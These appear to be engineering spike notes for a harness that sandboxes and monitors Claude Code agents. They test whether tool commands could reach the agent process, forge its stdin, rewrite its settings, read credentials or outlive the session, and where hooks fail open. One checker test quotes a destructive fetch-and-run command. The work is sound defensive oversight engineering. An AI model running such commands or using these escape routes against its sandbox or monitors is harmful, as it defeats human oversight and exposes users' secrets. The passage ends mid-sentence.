# Spike results

Spikes for the open questions Q1 (isolation of tool calls) and Q7 (checkers through headless
Claude Code) of [PLAN.md](../PLAN.md) §11, and for the question whether a hook that does not
answer in time lets the tool call run (Q11). Date: 2026-11-09. Claude Code CLI 2.1.319 (native
build), WSL2 Ubuntu 24.04 (kernel 6.18.54.1-microsoft-standard-WSL2), bubblewrap from Ubuntu,
model haiku. All runs used scratch projects in `/tmp/calu-spike-*`, `--setting-sources` limited as
stated, `--strict-mcp-config` and `--no-session-persistence`.

Files:

| File | Purpose |
|---|---|
| `probe.sh` | Run as a tool command. Reports PID namespace, visible processes, whether a `claude` process is visible and whether its `environ` is readable and its `fd/0` can be opened for writing, write access to Claude Code settings and `.git`, read access to credential files, network access, and starts a detached `sleep 177` to test leftover processes. |
| `get-socat.sh` | Extracts socat (needed by Claude Code's Linux sandbox) into `/tmp/calu-spike-tools` without root. |
| `spike_q1a_cc_sandbox.sh` | Q1a: Claude Code's own sandbox, set through `--settings`. |
| `spike_q1a_precedence.sh` | Q1a: can project/local settings switch that sandbox off? |
| `shell-prefix.sh`, `spike_q1b_shell_prefix.sh` | Q1b: `CLAUDE_CODE_SHELL_PREFIX` with a logging wrapper and with a bubblewrap wrapper. |
| `spike_q7_structured_check.sh` | Q7: `claude -p --json-schema` as a checker. |
| `spike_hook_timeout.py` | Does a PreToolUse hook that misses its timeout let the call run? |
| `smoke_session.py` | A whole calu session against the real CLI (not a spike; a manual check). |

Run the Q1 spikes from a plain Linux environment. Started from Git Bash through `wsl.exe` with the
inherited Windows environment, Claude Code reported "the Windows sandbox is not active on this
session" and refused to start (with `failIfUnavailable`); with
`wsl.exe env -i HOME=... USER=... PATH=... bash spikes/<script>.sh` it used bubblewrap.

## Control: no isolation

`spike_q1b_shell_prefix.sh`, run "control" (wrapper only logs, no sandbox). A tool command:

- sees all 54 processes of the host PID namespace, including the `claude -p ...` process;
- can read that process's `/proc/<pid>/environ`;
- can open `/proc/<pid>/fd/0` (a pipe) for writing, i.e. could write forged stream-json messages
  into Claude Code's stdin;
- can write `~/.claude/settings.json`, `~/.claude.json`, create files in `~/.claude`, and write
  `.git/hooks` and `.git/config`;
- starts a detached `sleep 177` (`setsid nohup ... &`) that is still running after Claude Code
  has exited.

This confirms the threat behind decision D4.

## Q1a: Claude Code's own Bash sandbox

**Setup.** `claude -p --setting-sources "" --settings '{"sandbox":{"enabled":true,
"failIfUnavailable":true,"autoAllowBashIfSandboxed":true,"allowUnsandboxedCommands":false}}'
--tools Bash --allowedTools Bash`; Claude runs `bash probe.sh > probe.out 2>&1` (1) normally,
(2) with `run_in_background: true`, (3) with `dangerouslyDisableSandbox: true`, (4) with
additional `"filesystem":{"denyRead":["~/.claude/.credentials.json","/tmp/calu-spike-secret"]}`.

**Dependencies.** The Linux sandbox needs `bwrap` and `socat`. Without socat, Claude Code prints
"Sandbox disabled: ... socat not installed ... Commands will run WITHOUT sandboxing" and runs
commands unsandboxed. With `sandbox.failIfUnavailable: true` it exits instead: "sandbox required
but unavailable ... refusing to start without a working sandbox". `failIfUnavailable` is a
documented setting in the CLI's schema ("Exit with an error at startup if sandbox.enabled is true
but the sandbox cannot start").

**Observations (all four runs alike, except where stated).**

- Own PID and mount namespace (`pid:[4026532484]`, host `pid:[4026532216]`). `/proc` shows only
  the sandbox's own processes (bwrap init as PID 1, the shell, the probe). No `claude` process
  is visible, so its `environ` and `fd/0` cannot be reached.
- Not writable: `~/.claude/settings.json`, `~/.claude.json`, `~/.claude/` (no new files),
  project `.claude/settings.json` and `.claude/settings.local.json`, `.git/hooks`, `.git/config`.
  The project directory itself is writable.
- Network: TCP to 1.1.1.1:443 blocked (no allowed domains configured).
- The detached `sleep 177` does not survive: no such process exists after Claude Code exits.
- Background commands (`run_in_background`) run in the same kind of sandbox.
- `dangerouslyDisableSandbox: true`: the call was not refused, but the command still ran in the
  sandbox (same namespaces and restrictions) because `allowUnsandboxedCommands` is false.
- Readable by default: `~/.claude/.credentials.json` (Claude Code's OAuth credentials) and
  `~/.ssh/id_rsa`. With `sandbox.filesystem.denyRead` the listed paths become unreadable
  (`~/.claude/.credentials.json` and `/tmp/calu-spike-secret` "not readable"; `~/.ssh/id_rsa`,
  not listed, stays readable). The CLI's built-in defaults also deny reading the Docker,
  containerd, podman and buildkit sockets, `/run/dbus` and `/run/user`.

**Precedence** (`spike_q1a_precedence.sh`). The project's `.claude/settings.json` and
`.claude/settings.local.json` set `sandbox.enabled: false, allowUnsandboxedCommands: true,
failIfUnavailable: false`; `--setting-sources project,local` loads them; `--settings` enables
the sandbox as above. Result: the command ran sandboxed (own PID namespace, `.git` not writable,
network blocked). Settings passed with `--settings` override project and local settings here.

**Conclusion.** Claude Code's sandbox meets 4.1 points 3, 4 and 6 for Bash commands, including
background commands, when calu passes `--settings` with `enabled`, `failIfUnavailable: true` and
`allowUnsandboxedCommands: false`. calu must add `denyRead` entries for secrets (at least
`~/.claude/.credentials.json`, `~/.ssh`, cloud credentials, calu's own credential file), because
reads are allowed by default. Not covered by this sandbox: Edit/Write/Read tools (they run in the
Claude Code process; calu's hook and deny lists must cover them, see PLAN.md §4.2).

## Q1b: CLAUDE_CODE_SHELL_PREFIX

**Setup.** `CLAUDE_CODE_SHELL_PREFIX=<scratch>/shell-prefix.sh`, Claude Code's sandbox off,
`--setting-sources ""`. The wrapper logs its argv; mode `log` then runs the command unchanged,
mode `bwrap` runs it in `bwrap --die-with-parent --unshare-pid --ro-bind / / --dev /dev --proc
/proc --bind /tmp /tmp --bind <project> <project>`.

**Observations.**

- Every Bash command goes through the prefix, foreground and `run_in_background` alike.
- argv shape: the prefix gets **one argument**, the complete shell script Claude Code builds, e.g.
  `source ~/.claude/shell-snapshots/snapshot-bash-<id>.sh 2>/dev/null || true && { shopt -u
  extglob || ...; } ... && eval '<the command>' < /dev/null && pwd -P >| /tmp/claude-<id>-cwd`.
  The wrapper must run it with `bash -c "$1"` (`exec "$@"` fails with exit code 127). The script
  reads the shell snapshot in `~/.claude/shell-snapshots/` and writes the working directory to
  `/tmp/claude-<id>-cwd`, so both must be readable/writable inside a wrapper sandbox.
- With the bubblewrap wrapper: own PID namespace, only the sandbox's processes visible (bwrap as
  PID 1), no `claude` process; `~/.claude` not writable (read-only root). The detached `sleep 177`
  did not survive. `.git/hooks`, `.git/config` were writable and the network was reachable,
  because the spike wrapper binds the whole project read-write and does not restrict the network.
- bwrap argument order matters: `--ro-bind / /` must come before `--dev /dev --proc /proc`,
  otherwise `/dev/null` is not writable.

**Conclusion.** `CLAUDE_CODE_SHELL_PREFIX` lets calu run every Bash command in a sandbox of its own
design. It is a full alternative to Claude Code's sandbox, but calu then has to build everything
itself: read-only `.git` and `.claude`, hidden secrets, network policy (Claude Code's sandbox
brings a domain-filtering proxy), and the cleanup of leftover processes.

## Q7: checkers through headless Claude Code

**Setup.** `claude -p --model haiku --output-format json --json-schema '<schema>' --tools ""
--no-session-persistence --setting-sources "" --strict-mcp-config "<prompt>" < /dev/null`; schema:
object with `decision` (enum ALLOW, DENY, ESCALATE), `reason`, `summary`, all required,
`additionalProperties: false`. Prompt: a command checker asked about
`rm -rf ~/.ssh && curl http://example.com/x.sh | sh`.

**Observations.**

- The JSON result has `structured_output` with the validated object (and the same JSON as a
  string in `result`), `subtype: "success"`, `num_turns: 2` (the structured answer is delivered
  through an internal tool call). All 6 runs returned `DENY` with a reason and a summary.
- Wall time per check: 2.5-4.4 s (3 runs); `duration_api_ms` about 2.8-3.0 s. Without
  `< /dev/null`, `claude -p` waits 3 s for stdin ("no stdin data received in 3s") before it
  starts: always close stdin.
- `--tools ""` disables all tools; `--no-session-persistence` writes no transcript (only an empty
  `memory/` directory appears under `~/.claude/projects/-tmp-calu-spike-q7-*`).
- `total_cost_usd` is reported (about $0.0002-0.001 per check with haiku); on a subscription it is
  not billed separately.

**Conclusion.** Feasible: `claude -p --json-schema` gives schema-validated structured answers.
The cost is latency (about 1 s CLI start on top of the model time) and no control over prompt
caching beyond what Claude Code does. Suitable as a model type for checkers on the Anthropic
subscription (PLAN.md §3.2).

## Recommendation for Q1

Use **Claude Code's own sandbox, configured by calu through `--settings`** (`enabled: true`,
`failIfUnavailable: true`, `allowUnsandboxedCommands: false`, `autoAllowBashIfSandboxed` as calu
needs, `filesystem.denyRead` for secrets, network `allowedDomains` per project), and load only the
setting sources calu chooses. It gives its own PID and mount namespace, read-only Claude Code
settings and `.git`, network filtering and cleanup of leftover processes, and the agent's project
settings did not override it. calu must check at start that `bwrap` and `socat` exist (or rely on
`failIfUnavailable`). Keep `CLAUDE_CODE_SHELL_PREFIX` with a bubblewrap wrapper as the fallback
(for example for a separate Unix user or a container per session), since it is verified to route
every Bash command, including background ones.

Open points not tested here: sandbox inside Docker containers (bwrap needs user namespaces;
`enableWeakerNestedSandbox` exists for that), the network proxy's domain allow list, and
whether a newer CLI changes the precedence of `--settings` over project settings (re-run
`spike_q1a_precedence.sh` after CLI updates).

## Hook timeouts: does a hook that does not answer let the call run?

**Why it matters.** calu's guarantee is that no tool call runs unchecked. If the hook that asks
the checkers could time out and the call then continued, every guarantee would be a race.

**Setup** (`spike_hook_timeout.py`, Agent SDK, CLI 2.1.319, haiku). A throwaway directory,
`tools=["Bash"]`, `permission_mode="bypassPermissions"` (so that **every** fallback path would
run the command) and an in-process PreToolUse hook with `timeout=2` that sleeps 20 seconds and
would then answer "allow". Claude is asked to run `echo spike > marker.txt`. The control is the
same hook without the sleep.

**Observations.**

- The command did **not** run: no `marker.txt`, although the permission mode was
  `bypassPermissions`. The in-process SDK hook therefore fails **closed**, as the SDK reference
  says for v2.1.210+.
- The CLI enforced the hook's own timeout: the whole run took 13.7 s, not 2 × 20 s.
- Claude's tool result named the cause ("a PreToolUse hook didn't respond before its timeout …
  the call was not executed, the host client may be unreachable").
- Claude **retried the call once** (the hook was called twice) and then gave up and reported it.
  So a hook that hangs costs its timeout per attempt, which is the reason to keep the PreToolUse
  timeout close to the checker deadline instead of giving it hours.
- The control wrote the marker, so the setup does prove the point.

**Conclusion.** In calu's own wrap the hook is an in-process callback of the Agent SDK, so a
hook that hangs stops the step. calu additionally bounds the checker call inside the hook
(`CHECKER_DEADLINE_S`, 840 s) and escalates when it is exceeded, so the hook answers with a
decision long before its own timeout; the wait for a human is not in the hook at all but in
`can_use_tool`, which may wait without a limit. The PreToolUse matcher therefore gets
`HOOK_TIMEOUT_S` (900 s), not the 24 hours that the two hooks which do wait for a human
(PostToolUse for Agent/Task, SubagentStop) need.

A **shell hook of a plugin** is the opposite case: the reference says its timeout discards the
output and lets the call continue through the normal permission flow (fail-open). That is one of
the reasons why PLAN.md §4.5 does not move calu's hooks into a plugin, and if that mode is ever
built (Q10), the shell hook must answer "deny" itself when it cannot reach the calu process,
instead of leaving the decision to its timeout.

## PostToolUse for Bash: reviewing what a command wrote (2026-11-09)

**Why it matters.** The step checker judges a command before it runs and cannot know what it
will write. D31 reviews the change afterwards, which only works if Claude Code lets calu run a
hook *after* a Bash call, waits for it, and passes the answer on.

**Setup.** `spikes/smoke_session.py <dir> --changes` with the real CLI (2.1.319, haiku), the
rule-based fake checkers, `changes.snapshot` and `changes.review` on, and the prompt "run exactly
this: `printf 'hello # calu:%s\n' deny > note.txt`". The marker is assembled by `printf`, so the
*command line* does not hold `calu:deny` and the pre-call check passes; the *written file* does,
so the review refuses it.

**Observations.**

- The command was allow-listed, so it passed without a model call, ran, and wrote `note.txt`.
- The `PostToolUse` matcher for `Bash` fired with the call's `tool_use_id`. calu measured the
  write set (1 path, 18 bytes), the changeset checker read the patch and answered DENY.
- calu reverted the file with `git apply --reverse` from its own snapshot; the project directory
  was clean afterwards (`git status` empty, no `note.txt`).
- The note reached Claude as a priority message: it reported the refusal, named the reason and
  did **not** retry the command.
- The database held the write set on the `steps` row and a `checker_runs` row for the review
  (`changeset`, decision `deny`, with its duration), so the review has the same audit trail as
  every other check.

**Conclusion.** A post-call review with a revert works against the real CLI. The hook keeps
`REVIEW_HOOK_TIMEOUT_S` (24 h), because the review may ask a human; the wait itself is in
`Session.ask`, as for an escalation before a call.

## The agent's own question: can calu answer `AskUserQuestion`? (2026-11-09)

**Why it matters.** The owner's reading is that a question from the agent is an escalation of a
kind. Other harnesses answer it (Orca renders it as a card with choices, opencode has a
`question` permission), but calu had no route for it: `AskUserQuestion` was on the read-only
list and ran unchecked.

**Setup** (`spikes/spike_question_tool.py`, CLI 2.1.319, haiku). Claude is asked to use the tool
and then report the answer. Three runs: the hook allows the call, the hook denies it with the
answer as its reason, and the hook answers "ask" so that `can_use_tool` decides (which is what
calu's ESCALATE does). `can_use_tool` always denies with "The user answered: ...".

**Observations.**

- The hook **does** see the call, with the whole question in `tool_input`:

      {"questions": [{"question": "Should this project indent with tabs or with spaces?",
                      "header": "Indentation",
                      "options": [{"label": "Tabs", "description": "..."},
                                  {"label": "Spaces", "description": "..."}],
                      "multiSelect": false}]}

  so a client can render the real choices rather than a free-text box. The hook input also
  carries `permission_mode` and `effort`.
- **A denial message is the answer channel.** In all three runs Claude's final sentence named
  the answer that `can_use_tool` had put in its denial message ("You answered that the project
  should indent with spaces, four per level"). The tool call does not run; Claude reads the
  message as the result and acts on it.
- **Deny from the hook makes Claude ask twice**: in that run the hook saw `AskUserQuestion`
  twice. Answering through `can_use_tool` was seen once. So the right channel is the one calu
  already uses for a human decision (`Session.ask`), not a hook denial.
- Letting the call run (hook "allow") did not fail in headless mode, but it did not reach a
  human either — the answer came from `can_use_tool` in that run too.

**Conclusion.** A question is an escalation whose answer travels back as the message of a
refusal, which is exactly the shape of `Session.ask`. calu therefore routes `AskUserQuestion` to
a human (`Route.QUESTION`), stores the questions and their options in the escalation, and
returns the chosen answer as the message. The state of such an escalation is neither "allowed"
nor "denied", so the database gets a third one, `answered` (migration 0011).

## Forking a session at an earlier step (2026-11-10, answers Q13)

**Why it matters.** Every other agent UI offers "rewind to here" and "fork from this response";
calu could only resume a session by its id, so the web interface had no honest button to offer.

**Setup** (`spikes/spike_fork_session.py`, CLI 2.1.319, haiku). A throwaway directory, two turns
("create alpha.txt", then "create beta.txt"), then a fork that keeps turn 1 and drops turn 2,
and finally the same fork with a deliberately wrong `resume_drops_turn`.

**Observations.**

- The Agent SDK has the pieces: `resume` with `fork_session=True` forks at the end;
  `resume_session_at=<transcript entry uuid>` forks at an earlier point; `resume_drops_turn=<uuid
  of the prompt whose turn is discarded>` makes the CLI validate the point;
  `get_session_messages(session_id, directory=...)` reads the uuids; `enable_file_checkpointing`
  plus `ClaudeSDKClient.rewind_files(uuid)` puts the files back; and a module-level
  `fork_session()` makes an offline truncated copy without resuming.
- **It works.** The fork answered "alpha.txt" to "which files have you created in this
  conversation?" — it remembered the kept turn and did not know about the dropped one — and it
  ran under a **new session id**, so the original is untouched.
- **A user-role entry is not always a prompt.** The transcript of two turns had eight entries,
  four of them `type == "user"`: two prompts and two tool results. The first attempt picked the
  second *user entry* as the dropped turn, which is a tool result, and the CLI refused. A prompt
  is a user-role entry whose content holds no `tool_result` block.
- **The fork point is the last entry of the kept turn**, which is the entry just before the next
  prompt, not necessarily its last assistant message (they coincided here, because the turn ended
  with Claude's text).
- **The guard fires** on a mismatched point, with exactly the documented text
  (`Resume rejected by --resume-drops-turn:`), raised as a `ResultError`. Treat it as
  deterministic and resume plainly instead of retrying.

**Conclusion.** calu can offer "fork before this turn" (D36). What it needs is the uuids: the
runner already passes `replay-user-messages` and sees `UserMessage`, so it can record the prompt
uuid of each turn and the uuid of the turn's last assistant entry, instead of parsing the
transcript later.

## Checker models on an Anthropic API key, with the main chat on the subscription (2026-11-10)

**Why it matters.** An Anthropic Ultra subscription includes API credits, so the obvious setup
is Claude Code on the subscription and the checkers on an Anthropic API key. That only works if
Claude Code does **not** see the key, or it would bill the API for the main conversation.

**Observations** (CLI 2.1.319, `claude -p --setting-sources "" --no-session-persistence`).

- With `ANTHROPIC_API_KEY=""` in the environment the CLI answered normally, so a **blanked** key
  leaves the subscription in place. That is exactly what calu does: `SdkRunner._claude_env`
  blanks every name in `hidden_env`, and `anthropic` is already in `PROVIDER_KEYS_BY_PREFIX`.
- With a non-empty but invalid key the CLI also answered, so in print mode it did not switch to
  the API on the strength of the environment alone. calu does not rely on that: blanking is the
  measured behaviour and stays the mechanism.

**Conclusion.** The setup works today (D37): put `ANTHROPIC_API_KEY` in `~/.config/calu/.env`,
point the checkers at `anthropic:...` models, and Claude Code keeps the subscription because
calu blanks the key for it. Re-run this check after a CLI update.

## calu forking its own recorded conversation (2026-11-10, D36 end to end)

**Setup** (`spikes/spike_calu_fork.py <dir>`, CLI 2.1.319, haiku, fake checkers). Three runs of
`run_session` against a throwaway database: "create alpha.txt", then `--resume` with "create
beta.txt", then `--resume --fork-before-turn 2` asking which files it created.

**Observations.**

- calu recorded a prompt uuid and a last-entry uuid for **both** turns, from the events Claude
  Code replays (`replay-user-messages`), and the two turns landed in **different `sessions`
  rows** — one per run — which is why the fork lookup spans every row with the same Claude
  session id. A first version joined within one row and found nothing; the database test
  `test_a_fork_point_spans_the_runs_of_one_conversation` now covers it.
- `herd.fork_point` returned the right pair, and the forked run answered "alpha.txt": it kept
  turn 1 and did not know turn 2. Its Claude session id differed from the original's, so the
  conversation that was forked from is untouched.

**Conclusion.** `calu run --resume <id> --fork-before-turn <n>` works, and the session page
offers the command per turn.

## Does auto mode ask, and would calu notice? (2026-11-10, D38)

**Why it matters.** calu's PASS hands the decision to Claude Code's own approval (D21). The
owner observed that auto mode can also *ask* for a confirmation rather than only allowing or
denying, which should become an escalation even though no checker objected.

**Setup** (`spikes/spike_auto_mode_ask.py`, CLI 2.1.319, haiku). `permission_mode="auto"`, a
PreToolUse hook that returns an empty output (no decision, exactly as calu does for PASS), and a
`can_use_tool` that records what it is asked about and refuses. Four prompts: `ls`, a write
**outside** the project directory, `rm -rf` of a directory, and a first `WebFetch` of a domain.

**Observations.**

- `can_use_tool` was **never** called. Auto mode allowed all four, including the write outside
  the project directory and the first fetch of a domain never seen before.
- So in headless mode auto mode is more permissive than the confirmation dialog of the
  interactive terminal, where the owner saw the question. It is not a layer to lean on: the step
  that wrote outside the project would have been stopped only by calu's own rules.
- The handling is nevertheless in place and is the only one the SDK allows: a permission
  question can reach a host program through `can_use_tool` and nowhere else, and calu's
  `can_use_tool` goes straight to `Session.ask`, which opens an escalation and waits without a
  limit. A step the checkers passed therefore escalates if the harness asks, with
  `HARNESS_ASKED` as the reason so nobody looks for a checker verdict that does not exist
  (`tests/unit/test_session.py::test_a_confirmation_the_harness_asks_for_escalates_even_after_a_pass`).

**Conclusion.** calu handles it, and this is the verified path; what could not be reproduced is
auto mode asking at all in headless mode. Re-run this spike after a CLI update — if the
classifier starts asking, nothing in calu has to change, and if it asks a lot, that is a reason
to look at `auto_escalate` instead.

## calu's own sandbox, end to end (2026-11-10, D15 through a real session)

**Why it matters.** Everything in §4.1 that is not the checkers rests on the sandbox: a command
must not read the credentials, write Claude Code's configuration, reach the Claude Code process,
or leave something running. Until now that had been measured with `claude -p` directly (Q1a),
never through calu, because this machine has no `socat` and a session with the default settings
refuses to start without it.

**Setup.** `bash spikes/get-socat.sh` puts socat into `/tmp/calu-spike-tools/bin` without root,
then `PATH=/tmp/calu-spike-tools/bin:$PATH uv run python spikes/smoke_session.py <dir> --sandbox`
with a prompt that runs `bash probe.sh > probe.out` (CLI 2.1.319, haiku, fake checkers).

**Observations** (from `probe.out`, written by the sandboxed command itself).

- The session **started** with `sandbox.enabled` and `failIfUnavailable: true`, so the sandbox
  really came up; the command was checked (`command` checker, PASS) and ran.
- Own PID and mount namespace (`pid:[4026532560]`), six visible processes, and **no `claude`
  process among them**: the agent cannot read its environment or write its pipes (4.1 points 3
  and 4).
- `~/.claude/settings.json`, `~/.claude.json`, the project's `.claude/settings.json` and
  `.claude/settings.local.json`: **not writable**; `~/.claude`: cannot create files. So a command
  cannot switch the hooks or the sandbox off.
- `~/.claude/.credentials.json`: **not readable**, and `~/.ssh/id_rsa`, `~/.ssh/id_ed25519` and
  `/tmp/calu-spike-secret` are hidden — calu's `deny_read` defaults do their job (4.1 points 1
  and 2).
- The project directory is writable, so work is still possible.
- Network: TCP to 1.1.1.1:443 blocked (no `allowed_domains` configured).
- The detached `sleep 177` the probe started did **not** survive the session (4.1 point 6).

**Conclusion.** calu's sandbox settings work as D15 claims, through calu. The only missing piece
on this machine is socat, which `apt install socat` solves permanently and `get-socat.sh` solves
without root; re-run this check after a CLI update, and prefer `--sandbox` when running the smoke
session.

## The sandbox's network policy (2026-11-10, answers Q5's mechanism, D39)

**Why it matters.** `projects.network_policy` has existed since the first migration with the
values "none", "proxy" and "full", and **nothing applied it**: the column was inert and its
default said "full" while the sandbox in fact blocked everything. To wire it, the three policies
have to be expressible in Claude Code's sandbox settings.

**Setup.** `claude -p` with the sandbox on (CLI 2.1.319, haiku, socat from `get-socat.sh`) and a
probe inside it that prints the proxy environment and tries `https://example.com` and
`https://1.1.1.1`, first with raw TCP (`/dev/tcp`), then with curl.

**Observations.**

- The sandbox runs a filtering HTTP proxy and exports it: `HTTPS_PROXY=http://<credentials>@127.
  0.0.1:3128`. **Raw TCP is blocked whatever the policy says** — `/dev/tcp/example.com/443`
  failed even with the domain allowed, so the policy only governs what goes through the proxy.
  Anything that ignores the proxy variables reaches nothing, which is a useful property in
  itself.
- No `network` key: curl to both hosts failed. Nothing is reachable.
- `network.allowedDomains: ["example.com"]`: `https://example.com` answered **200**, and
  `https://1.1.1.1` failed. The allow list works, and it is a domain list, not an address list.
- `network.allowedDomains: ["*"]`: both answered (200 and a 301). So the wildcard is how
  "everything" is written.
- `allowedDomains: ["*"]` with `deniedDomains: ["example.com"]`: example.com failed, 1.1.1.1
  still answered. The deny list wins over the wildcard, so "everything except these" works.

**Conclusion.** The mapping of D39: "none" emits no allow list, "proxy" emits the configured
domains, "full" emits `["*"]`, and the deny list is kept in every case. What remains for the
owner (Q5) is only the **default** for new projects, which stays "full" in the schema while the
start-up warnings now say plainly when a session can reach every domain.

## The sandbox inside a Docker container (2026-11-10, answers the first half of Q1)

**Why it matters.** calu is meant to run on "WSL2, Docker, remote SSH hosts", and its own
`docker-compose.yml` has a `dev` system. Claude Code's sandbox needs bubblewrap, which needs an
unprivileged user namespace — and whether a container may create one was untested.

**Observations** (Docker on WSL2, kernel 6.18).

- A default container **cannot**: `unshare -Ur true` fails with "Operation not permitted", and
  real bubblewrap says "No permissions to create new namespace, likely because the kernel does
  not allow non-privileged user namespaces". So the sandbox cannot start there at all, whatever
  its settings say.
- It is **seccomp**, not AppArmor: with `--security-opt apparmor=unconfined` it is still
  blocked, while `--security-opt seccomp=unconfined` lets both `unshare -Ur` and a real
  `bwrap --unshare-user --unshare-pid --ro-bind / / --proc /proc --dev /dev` run.
- `--cap-add SYS_ADMIN` and `--privileged` also work, but grant more than is needed.
- calu's own `docker/dev.Dockerfile` installed bubblewrap but **not socat**, so even with the
  namespace allowed the sandbox would have refused to start. Both are fixed: socat is installed
  and the `dev` service carries `security_opt: [seccomp:unconfined]`.

Verified afterwards in calu's own image: `docker compose run --rm --no-deps dev` has bwrap,
socat, claude and git, and a real `bwrap --unshare-user --unshare-pid ...` runs inside it.

**Conclusion.** Inside a container the sandbox needs `seccomp=unconfined` (plus bubblewrap and
socat). That is a trade: the container's own seccomp is loosened so that the inner sandbox can
exist. Where the container is already the boundary, what the inner sandbox still adds is the
read denial for credentials, the PID namespace that hides the Claude Code process, and the
cleanup of leftover processes — which is why it is worth having. What remains untested is what
`sandbox.enableWeakerNestedSandbox` (`claude.sandbox.weaker_nested_sandbox`) changes: that needs
a logged-in `claude` inside a container, which this machine cannot provide without copying the
owner's credentials into it.

## What `rewind_files` puts back (Q14, 2026-11-10)

**Question.** A fork rewinds the conversation (D36) but leaves the working tree as the dropped
turn left it. Should calu also rewind the files with the SDK's file checkpointing?

**Setup** (`spikes/spike_rewind_files.py`, CLI 2.1.319, haiku). A throwaway directory,
`enable_file_checkpointing=True`, `extra_args={"replay-user-messages": None}`, tools Bash and
Write, `bypassPermissions`. Two turns, each writing the same two files -- one with the Write
tool, one with `echo v1 > file` -- plus a third file that only the second turn creates. Then
`client.rewind_files(<uuid of the second turn's user message>)`, which is the state after turn
one.

**Observations.**

| file | written by | after turn 2 | after the rewind |
|---|---|---|---|
| `tool_file.txt` | the Write tool | `v2` | **`v1`** -- put back |
| `bash_file.txt` | `echo v2 > …` in Bash | `v2` | `v2` -- **left as it was** |
| `bash_new.txt` | `echo new > …` in Bash | `new` | `new` -- **left as it was**, not removed |

So "tracked files" means the files Claude Code's own edit tools changed. What a command wrote is
not tracked, neither an overwrite nor a newly created file, and the rewind reports no error
about it.

**What follows.** calu does **not** use `rewind_files` for a fork (Q14 answered, D46). It would
produce a half-reverted tree: the tool edits go back, the command writes stay, and the result
looks consistent while it is not -- the worst of the three possible states for a human who then
reviews the fork. calu already has the mechanism that does cover commands, D31's snapshots (a
git scratch index that measures and reverts everything a step wrote, Bash included), so file
rewinding belongs there if it is wanted, and only with `changes.enabled` on. Until then a fork
says plainly that it does not touch the files.

**Re-run when** the SDK or the CLI changes what checkpointing tracks; one line of the table is
enough to tell.

## Row-level security instead of a role per session (Q3, 2026-11-10)

**Question.** Q3 asks whether every session should get its own database role. One
`calu_session` login can read and write every session's rows today
(`GRANT SELECT, INSERT, UPDATE ON hosts, sessions, turns, steps, chat_summaries`, migration
0001). A role per session would need the owner credential at session start and a reaper for the
roles of sessions that are gone, so the recommendation was the cheaper shape: row-level security
on the one login, keyed on a session id the connection sets once. This spike builds that shape
and measures it.

**Setup** (`spikes/spike_session_rls.py`, PostgreSQL 18). A throwaway database with `calu setup`
run in it, two session rows, and the candidate policies (the SQL is in the spike file): RLS on
`sessions`, `turns`, `steps`, `escalations`, `checker_runs` and `chat_summaries`, each policy
`USING (session_id = current_setting('calu.session_id', true)::uuid)` with the same `WITH
CHECK`, plus a permissive SELECT policy for `calu_operator`, because only a superuser can grant
`BYPASSRLS`. Three `calu_session` connections -- two with an id set, one that never sets one --
and one operator connection.

**Observations.** All ten checks pass:

| | |
|---|---|
| a session writes and reads its own rows | yes |
| it cannot see the other session's rows | yes |
| it cannot update the other session's rows (`rowcount` 0) | yes |
| it cannot insert a row for the other session (`InsufficientPrivilege`) | yes |
| its own escalation can still be cancelled (`calu_cancel_escalation`, SECURITY DEFINER) | yes |
| a connection that never set the id sees nothing | yes |
| ... and cannot write either | yes |
| a session **cannot insert its own `sessions` row** any more | yes -- see below |
| a SECURITY DEFINER starter creates that row and the session takes it over | yes |
| `calu_operator` still sees every session's rows | yes |

The eighth line is the one worth having built this for. `DatabaseSessionStore.start` creates the
session's own row with `INSERT INTO sessions ... RETURNING id`, and under a `WITH CHECK` policy
that insert is refused: the id does not exist until the insert happens, so the connection cannot
have set it beforehand. Switching the policies on without noticing would have broken **every**
session at startup. The way around it is a SECURITY DEFINER `calu_start_session(...)` that
creates the row as the owner and returns the id for the session to set, which the spike now also
measures.

Two details worth keeping: the SECURITY DEFINER functions are unaffected, because they run as
the owner, for whom the policies do not apply; and the failure mode of forgetting the setting is
**immediate and total** -- the session cannot write its first step -- rather than subtle, which
is better than I assumed when I recommended deferring it.

**Shipped** as migration 0015 (D49) on the same day, with two more owner-side functions that
only writing it for real turned up: `calu_recent_sessions` for `session.list` and the resume
list, and `calu_conversation_sessions` plus `calu_same_conversation` for the rows of one Claude
conversation, which a resume or a fork continues under a new `sessions` row. The notes below are
what the spike itself measured.

**What follows.** The shape is sound, and the work it needs is now exact: one migration (the
policies, `calu_start_session`, the operator's read policies), `store.start` calling that
function instead of its plain insert, one `set_config` after a session connects, and the same in
every test fixture that connects as `calu_session`. Enabling it is the owner's call, because it is what Q3 asks about: it
changes the threat model (a compromised session process can no longer rewrite another session's
history) and adds a precondition to every path that connects as `calu_session`, the test
fixtures included. What it does **not** buy: a session can still write nonsense about itself,
which no role separation prevents, because a compromised session process *is* that session.

**Re-run when** the schema gains a table a session writes, which would need a policy of its own
(the spike's SQL is the place to add it).

## A single-file binary: does the package data survive freezing? (Q15, 2026-11-10)

**Question.** REQUIREMENTS 21 and soft goal 2 ask for a single executable beside the installable
package. D41 recommended against building one, and one of its three reasons was that freezing
would put the data calu reads at run time -- migrations, default checker instructions, rules,
eval cases, web templates, static files -- "behind a frozen-import layer that
`importlib.resources` reaches differently in each freezer". That claim was never measured, so
here it is.

**Setup** (`scripts/build-binary.sh`, PyInstaller 6.22.3, Linux x86_64, Python 3.14). One-file
build of a tiny entry point that calls `calu.cli.main`, with `--collect-data calu`,
`--collect-submodules calu` and the `web` extra. Then the binary against a throwaway database
with its own `XDG_CONFIG_HOME`.

**Observations.**

| | |
|---|---|
| size | 70 MiB |
| startup (`calu --version`) | ~1.8 s -- **faster** than the same command from the installed wheel (~2.6 s), because the imports come out of one archive |
| `calu protocol` | 52 definitions, as from a checkout |
| `calu setup` | **14 migrations applied, 5 checker types, 45 rules** -- `importlib.resources` finds the package data inside the archive |
| `calu web` | serves the fleet page and `/static/calu.css`, so Jinja2 templates and static files work too |
| `calu doctor` | runs, and sees the `web` extra through `find_spec` |

The one real obstacle was not the package data. `genai_prices`, a dependency of pydantic-ai,
reads its **own package metadata** at import time, so the first binary died with
`PackageNotFoundError` before `main()` ran; `--copy-metadata genai_prices` fixes it. Nothing at
build time warned about it, which is why `scripts/build-binary.sh` runs the binary it builds and
why the release workflow's `binary` job does the same.

**What follows.** D41's reason about package data was **wrong**, and so was the implied cost: a
binary is one script and one CI job, and it starts faster than the wheel. What remains true is
that it does not remove the other two prerequisites (PostgreSQL and the `claude` CLI), that it
is 70 MiB per platform and libc, and that a new dependency which reads its own metadata or data
